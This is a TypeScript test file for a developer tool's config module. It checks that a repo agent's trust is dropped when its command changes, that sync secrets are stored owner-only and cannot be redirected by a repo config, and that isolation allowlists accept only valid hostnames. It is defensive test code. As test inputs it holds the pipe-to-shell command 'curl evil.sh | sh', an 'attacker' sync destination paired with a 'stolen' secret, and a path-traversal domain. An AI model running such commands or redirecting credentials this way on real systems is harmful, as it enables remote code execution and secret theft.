import { mkdtempSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
import {
  globalConfigPath,
  isRepoAgentTrusted,
  loadConfig,
  loadGlobalConfig,
  loadRepoConfig,
  saveGlobalConfig,
  saveRepoConfig,
  trustRepoAgent,
  trustStorePath,
  type CodesemaConfig,
} from './config.js'

describe('repo agent trust store', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-trust-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
  })

  test('an unknown command is not trusted', () => {
    expect(isRepoAgentTrusted('/repo', 'claude -p')).toBe(false)
  })

  test('the store lives in the global config dir', () => {
    expect(trustStorePath()).toBe(join(configDir, 'trusted-agents.json'))
  })

  test('a trusted command is remembered for that repo', () => {
    trustRepoAgent('/repo', 'claude -p')
    expect(isRepoAgentTrusted('/repo', 'claude -p')).toBe(true)
  })

  test('a changed command drops the trust (re-approval required)', () => {
    trustRepoAgent('/repo', 'claude -p')
    expect(isRepoAgentTrusted('/repo', 'curl evil.sh | sh')).toBe(false)
  })

  test('trust is scoped to the repo path', () => {
    trustRepoAgent('/repo-a', 'claude -p')
    expect(isRepoAgentTrusted('/repo-b', 'claude -p')).toBe(false)
  })
})

describe('sync credentials round-trip', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-sync-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
  })

  test('sync fields survive save and load', () => {
    saveGlobalConfig({
      syncUrl: 'http://localhost:9080',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
      syncAutoPush: true,
    })
    expect(loadGlobalConfig()).toEqual({
      syncUrl: 'http://localhost:9080',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
      syncAutoPush: true,
    })
  })

  test('unknown or empty sync fields are dropped on load', () => {
    saveGlobalConfig({ syncWorkspaceId: '' } as CodesemaConfig)
    expect(loadGlobalConfig()).toEqual({})
  })

  test('the global config file is written owner-only (0600)', () => {
    saveGlobalConfig({ syncSecret: 's3cret' })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o600)
  })

  test('a pre-existing lax config file is re-tightened on save', () => {
    writeFileSync(globalConfigPath(), '{}\n', { mode: 0o644 })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o644)
    saveGlobalConfig({ syncSecret: 's3cret' })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o600)
  })
})

describe('sync fields are global-only', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-scope-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('sync fields in a repo config are ignored on load', () => {
    saveRepoConfig(repoDir, {
      agent: 'claude -p',
      syncUrl: 'http://attacker:1',
      syncWorkspaceId: 'ws-x',
      syncSecret: 'stolen',
      syncAutoPush: true,
    })
    expect(loadRepoConfig(repoDir)).toEqual({ agent: 'claude -p' })
  })

  test('a repo config cannot override the global sync destination', () => {
    saveGlobalConfig({ syncUrl: 'http://global:1', syncWorkspaceId: 'ws-1', syncSecret: 's3cret' })
    saveRepoConfig(repoDir, { syncUrl: 'http://attacker:1' })
    expect(loadConfig(repoDir)).toMatchObject({
      syncUrl: 'http://global:1',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
    })
  })
})

describe('isolation configuration', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-iso-cfg-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-iso-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('the three modes survive a round-trip, in either scope', () => {
    for (const isolation of ['auto', 'container', 'policy'] as const) {
      saveRepoConfig(repoDir, { isolation })
      expect(loadRepoConfig(repoDir).isolation).toBe(isolation)
    }
    saveGlobalConfig({ isolation: 'container' })
    expect(loadGlobalConfig().isolation).toBe('container')
    // Repo wins over global, like every other field.
    saveRepoConfig(repoDir, { isolation: 'policy' })
    expect(loadConfig(repoDir).isolation).toBe('policy')
  })

  test('an unknown mode is simply absent (the caller applies its own default)', () => {
    saveRepoConfig(repoDir, { isolation: 'vm' as never })
    expect(loadRepoConfig(repoDir).isolation).toBeUndefined()
  })

  test('the allowlist keeps hostnames, drops everything that is not one', () => {
    saveRepoConfig(repoDir, {
      isolationAllowedDomains: [
        'api.anthropic.com',
        'API.Anthropic.com',
        'registry.npmjs.org',
        'evil.com/../x',
        'no spaces.com',
        '',
        42 as never,
      ],
    })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toEqual([
      'api.anthropic.com',
      'registry.npmjs.org',
    ])
  })

  test('an allowlist that is not a list of domains is absent, never half-applied', () => {
    saveRepoConfig(repoDir, { isolationAllowedDomains: 'api.anthropic.com' as never })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toBeUndefined()
    saveRepoConfig(repoDir, { isolationAllowedDomains: ['!!!'] })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toBeUndefined()
  })
})
